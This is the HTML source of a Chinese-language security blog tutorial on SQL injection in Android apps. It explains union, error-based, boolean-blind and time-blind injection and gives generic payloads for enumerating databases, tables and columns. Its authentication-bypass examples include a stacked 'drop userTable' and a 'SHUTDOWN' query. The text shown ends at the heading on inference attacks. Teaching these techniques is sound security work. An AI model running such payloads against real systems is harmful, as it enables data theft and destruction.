@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"security-kitchen.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.json"};
+  </script>
+
+  <meta name="description" content="一、前言最近一直很忙碌，即将进入本系列文章基础篇的最后几个篇章，本文主要讲述Android中存在的常见的SQL注入漏洞的方式，以及如何快速的挖掘SQL注入漏洞。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Android App漏洞之战（18）——Sql漏洞初探">
+<meta property="og:url" content="http://security-kitchen.com/2023/02/14/bug0018/index.html">
+<meta property="og:site_name" content="欢迎来到安全后厨！">
+<meta property="og:description" content="一、前言最近一直很忙碌，即将进入本系列文章基础篇的最后几个篇章，本文主要讲述Android中存在的常见的SQL注入漏洞的方式，以及如何快速的挖掘SQL注入漏洞。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/0.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/1.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/2.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/3.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/4.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/5.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/6.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/7.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/8.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/9.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/10.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/11.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/12.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/13.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/14.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/15.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/16.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/17.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/18.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/19.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/20.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/21.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/25.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/26.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/27.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/28.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/29.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/30.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/31.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/22.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/23.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/24.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/32.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/33.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/34.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/35.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/36.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/38.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/37.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/39.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/40.png">
+<meta property="article:published_time" content="2023-02-14T01:06:19.000Z">
+<meta property="article:modified_time" content="2023-12-23T09:13:44.113Z">
+<meta property="article:author" content="安全后厨团队">
+<meta property="article:tag" content="漏洞挖掘">
+<meta property="article:tag" content="工具">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/0.png">
+
+<link rel="canonical" href="http://security-kitchen.com/2023/02/14/bug0018/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Android App漏洞之战（18）——Sql漏洞初探 | 欢迎来到安全后厨！</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="欢迎来到安全后厨！" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	<div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://github.com/WindXaa?tab=repositories" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">欢迎来到安全后厨！</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>资源</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://security-kitchen.com/2023/02/14/bug0018/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="安全后厨团队">
+      <meta itemprop="description" content="选择有时候比努力更重要">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欢迎来到安全后厨！">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Android App漏洞之战（18）——Sql漏洞初探
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-02-14 09:06:19" itemprop="dateCreated datePublished" datetime="2023-02-14T09:06:19+08:00">2023-02-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-12-23 17:13:44" itemprop="dateModified" datetime="2023-12-23T17:13:44+08:00">2023-12-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/" itemprop="url" rel="index"><span itemprop="name">Android APP漏洞之战</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>最近一直很忙碌，即将进入本系列文章基础篇的最后几个篇章，本文主要讲述Android中存在的常见的SQL注入漏洞的方式，以及如何快速的挖掘SQL注入漏洞。</p>
+<span id="more"></span>
+<p>本文结构如下：</p>
+<p>第二节讲述SQL注入的基本原理</p>
+<p>第三节讲述常见的SQL注入漏洞并复现</p>
+<p>第四节讲述Content Provider上的sql注入漏洞</p>
+<p>第五节讲述DownProvider 上的sql注入漏洞</p>
+<h2 id="二、SQL漏洞原理介绍"><a href="#二、SQL漏洞原理介绍" class="headerlink" title="二、SQL漏洞原理介绍"></a>二、SQL漏洞原理介绍</h2><h3 id="1-SQL注入原理"><a href="#1-SQL注入原理" class="headerlink" title="1.SQL注入原理"></a>1.SQL注入原理</h3><p>通过实施 SQL 注入，攻击者可以获得对应用程序或数据库的完全访问权限，从而可以不负责任地删除或更改重要数据。未正确验证用户输入的应用程序使它们容易受到 SQL 注入的攻击。 SQL 注入攻击 (SQLIA) 发生在攻击者能够通过操纵用户输入数据将一系列恶意 SQL 语句插入“查询”以供后端数据库执行时。使用这种类型的威胁，应用程序可以很容易地被黑客入侵并被攻击者窃取机密数据。</p>
+<p>SQL攻击的原理图如下所示：</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/0.png" alt="image-20220707092239296"></p>
+<p>上图中攻击者将 SQL 语句添加到应用程序表单输入框中，以访问资源或更改存储在数据库中的数据。应用程序中缺少输入验证会导致攻击者成功。在 SQL 注入攻击中，攻击者通过应用程序注入字符串输入，从而改变或操纵 SQL 语句以使攻击者受益。</p>
+<h3 id="2-SQL注入分类"><a href="#2-SQL注入分类" class="headerlink" title="2.SQL注入分类"></a>2.SQL注入分类</h3><p>要学习SQL注入在Android上的使用，首先需要了解SQL注入的种类，SQL注入一般分为两种情况：<code>有回显和无回显</code>，有回显是指SQL语句返回的内容有显示在页面中；无回显是页面输出的内容并不是SQL语句返回的内容，而是“真”和“假”。</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/1.png" alt="image-20220707093229055"></p>
+<h4 id="（1）联合查询注入"><a href="#（1）联合查询注入" class="headerlink" title="（1）联合查询注入"></a>（1）联合查询注入</h4><p>联合查询注入是在原有的查询条件下，通过union拼接上select语句，union可以用于合并两个和多个select语句的结果集</p>
+<p>当union之前的select语句结果集为空时，查询结果将由union后的select语句控制。</p>
+<p>联合查询语句构造步骤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.order by判断原有查询语句的列数</span><br><span class="line">2.使原有查询语句的结果为空</span><br><span class="line">3.判断数据输出位置</span><br><span class="line">4.使用union语句拼接目标数据的查询语句</span><br></pre></td></tr></table></figure>
+
+<p>对于页面有回显，通常使用联合查询注入，可以快速爆出数据</p>
+<p>示例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">order by <span class="comment">//确定列数</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">//显示回显位</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,database(),user() <span class="comment">//通过回显位爆出内容</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) from information_schema.schemata <span class="comment">//爆库</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database() <span class="comment">//爆表</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;表名&#x27;</span> and table_schema=database() <span class="comment">//爆列</span></span><br><span class="line"></span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,group_concat(列名) from 表名 <span class="comment">//爆值</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="（2）报错注入"><a href="#（2）报错注入" class="headerlink" title="（2）报错注入"></a>（2）报错注入</h4><p>报错注入经过构造的函数，让函数处理<code>user()</code>等不合规定的数据，引发mysql报错；几乎任何与数据库有关的操作经过sql拼接都可以产生报错注入；当执行的SQL语句出错时返回错误信息，在错误信息中返回数据库的内容</p>
+<p>构造报错注入的语句：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>构造目标数据查询语句</span><br><span class="line"><span class="number">2.</span>选择报错注入函数</span><br><span class="line"><span class="number">3.</span>构造报错注入语句</span><br><span class="line"><span class="number">4.</span>拼接报错注入语句</span><br><span class="line">常见的报错注入函数：floor()、extractvalue()、updatexml()等</span><br></pre></td></tr></table></figure>
+
+<p>报错注入一般使用在查询不回显数据，但会打印错误信息的页面中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select <span class="title function_">user</span><span class="params">()</span>),<span class="number">0x7e</span>)) <span class="comment">//extractvalue报错将输出的字符长度限制为32位</span></span><br><span class="line"></span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select <span class="title function_">database</span><span class="params">()</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">//updatexml报错将输出的字符长度限制为32位</span></span><br><span class="line"></span><br><span class="line">select <span class="title function_">count</span><span class="params">(\*)</span> from information_schema.tables GROUP BY <span class="title function_">concat</span><span class="params">((select database()</span>),floor(rand(<span class="number">0</span>)\*<span class="number">2</span>)) <span class="comment">//floor报错将输出字符长度限制为64个字符</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="（3）布尔盲注"><a href="#（3）布尔盲注" class="headerlink" title="（3）布尔盲注"></a>（3）布尔盲注</h4><p>布尔盲注以页面回显内容的不同作为判定依据，通过构造语句返回页面的“真”和“假”来判断数据库信息的正确性</p>
+<p>布尔盲注提取数据的基本步骤：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>构造目标数据查询语句</span><br><span class="line"><span class="number">2.</span>选择拼接方式</span><br><span class="line"><span class="number">3.</span>构造判断表达式</span><br><span class="line"><span class="number">4.</span>提取数据长度</span><br><span class="line"><span class="number">5.</span>提取数据内容</span><br><span class="line">常见的拼接方式：原始条件真 and 判断条件真，原始条件假 or 判断条件真等</span><br></pre></td></tr></table></figure>
+
+<p>若网页设置了无报错信息返回，在不回显数据+不返回报错信息的情况下，只剩下盲注方法可用，而布尔盲注使用在对真&#x2F;假条件的返回内容很容易区分的页面中。</p>
+<p>示例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">length(database()) <span class="comment">//判断数据库名长度</span></span><br><span class="line"></span><br><span class="line">ascii(substr((database()),s,<span class="number">1</span>))=可用ASCII码值 <span class="comment">//从数据库库名第s位开始，截取一位，进行逐一猜解；数据库库、表、字段所有名称的可用字符范围为A-Z、a-z、0-9和下划线，也就是ASCII码值从48到122</span></span><br><span class="line"></span><br><span class="line">length((select table_name from information_schema.tables where table_schema=database() limit <span class="number">3</span>,<span class="number">1</span>)) <span class="comment">//判断数据库中的第4个表表名长度，第1个表从0开始</span></span><br><span class="line"></span><br><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="number">3</span>,<span class="number">1</span>),s,<span class="number">1</span>))=可用ASCII码值 <span class="comment">//逐一猜解第4个表的表名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//之后逐一猜解列名与数据</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="（4）时间盲注"><a href="#（4）时间盲注" class="headerlink" title="（4）时间盲注"></a>（4）时间盲注</h4><p>时间盲注通过构造语句，通过页面响应的时长来判断信息；时间盲注的关键点在于if()函数，通过条件语句进行判断，为真则立即执行，否则延时执行，通常使用sleep()等专用的延时函数来进行延时操作</p>
+<p>时间盲注与布尔盲注的语句构造过程相似，通常在布尔盲注表达式的基础上使用if函数加入延时语句来构造。通常情况下，盲注需要逐个字符进行判断，极大增加了时间成本，而对于时间盲注来说，还需要额外的延迟时间来作为判断的标准</p>
+<p>在布尔盲注永假条件所返回的内容与正常语句返回的内容很接近或相同，无法判断的情况下，可使用时间盲注</p>
+<p>示例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sleep() <span class="comment">//使用延时函数进行判断</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(length(database())=数字,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">//if()函数判断数据库长度，if(Condition,A,B)，当Condition为true时返回A，当Condition为false时返回B</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ascii(substr(database(),s,<span class="number">1</span>))=可用ASCII码值,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">//使用if函数，从第S位开始截取一位，逐一猜解数据库名，可用ASCII码值范围为48-122</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(length(select table_name from information_schema.tables where table_schema=database() limit <span class="number">3</span>,<span class="number">1</span>)=数字,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">//逐一猜解数据库第4个表长度，第1个表从0开始</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="number">3</span>,<span class="number">1</span>),s,<span class="number">1</span>))=可用ASCII码值,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">//逐一猜解数据库第4个表表名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//逐一猜解列名、数据</span></span><br></pre></td></tr></table></figure>
+
+<p>SQL注入的常见分类如上所述，由于本文主要针对Android上SQL注入讲解，这里就不再深入研究，这里引用博客：<a target="_blank" rel="noopener" href="https://www.modb.pro/db/163732">SQL注入漏洞分析</a>，要深入了解朋友可以看原作者博客，里面还有一些案例讲解。</p>
+<h3 id="3-SQL常见注入技巧"><a href="#3-SQL常见注入技巧" class="headerlink" title="3.SQL常见注入技巧"></a>3.SQL常见注入技巧</h3><p>前面我们已经了解了SQL注入的基本分类，下面我们介绍一些SQL注入实际的测试技巧：</p>
+<h4 id="（1）重言式攻击"><a href="#（1）重言式攻击" class="headerlink" title="（1）重言式攻击"></a>（1）重言式攻击</h4><p>重言式攻击通过一个或多个条件SQL语句查询注入代码，使SQL命令计算为真条件，如(1&#x3D;1)或（–）。一般可以用来绕过身份验证</p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from table <span class="type">where</span> <span class="variable">table_ID</span> <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> or <span class="string">&#x27;1=1&#x27;</span>--<span class="string">&#x27;AND table_password=&#x27;</span><span class="number">1234</span><span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="（2）Piggy-backed查询"><a href="#（2）Piggy-backed查询" class="headerlink" title="（2）Piggy-backed查询"></a>（2）Piggy-backed查询</h4><p>Piggy-backed Queries是一种攻击，它使用查询分隔符（如“；”）向原始查询注入额外的查询语句，从而危及数据库。 在这种方法中，第一个查询是原始的，而随后的查询是注入的。 这次攻击是非常危险的</p>
+<p>例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT pass FROM userTable WHEREuser_ld=<span class="string">&#x27;user1&quot; AND Password = 0; drop userTable</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="（3）逻辑错误"><a href="#（3）逻辑错误" class="headerlink" title="（3）逻辑错误"></a>（3）逻辑错误</h4><p>逻辑错误攻击利用数据库为错误查询返回的错误消息，这些数据库错误消息通常包含有用的信息，使攻击者能够发现应用程序和数据库架构中的易受攻击的参数。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM userTable WHEREuser_ld=’<span class="number">1111</span>’ AND password=<span class="string">&#x27;1234’ AND CONVERT(char, no)</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="（4）联合查询"><a href="#（4）联合查询" class="headerlink" title="（4）联合查询"></a>（4）联合查询</h4><p>联合查询注入称为语句注入攻击。 在此攻击中，攻击者在原始SQL语句中插入附加语句。 此攻击可以通过在Vulnerable参数中插入UNION查询或“；<SQL Statement>”形式的语句来完成。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT* FROM userTable WHEREuser_ld=<span class="number">1111</span><span class="string">&#x27;UNION SELECT *FROMmemberTable WHERE member_ld=&#x27;</span>admin<span class="string">&#x27;--&#x27;</span> AND password=<span class="string">&#x27;1234&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="（5）存储过程"><a href="#（5）存储过程" class="headerlink" title="（5）存储过程"></a>（5）存储过程</h4><p>在该技术中，攻击者主要关注数据库系统中存在的存储过程。 存储过程直接由数据库引擎运行。 它是一段可利用的代码。 存储过程为授权或未经授权的客户端提供true或false值。 对于SQLIA，攻击者将写入“； 关机； –“使用登录名或密钥。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT Username FROM UserTableWHEREuser_name= <span class="string">&quot;user1&quot;</span> AND pass=<span class="string">&quot; &quot;</span>; SHUTDOWN;</span><br></pre></td></tr></table></figure>
+
+<h4 id="（6）推断攻击"><a href="#（6）推断攻击" class="headerlink" title="（6）推断攻击"></a>（6）推断攻击</h4><p>利用推断攻击，攻击者可以改变数据库或应用程序的行为。 这种类型的攻击可以分为两种著名的技术，它们是：盲注入和定时攻击</p>
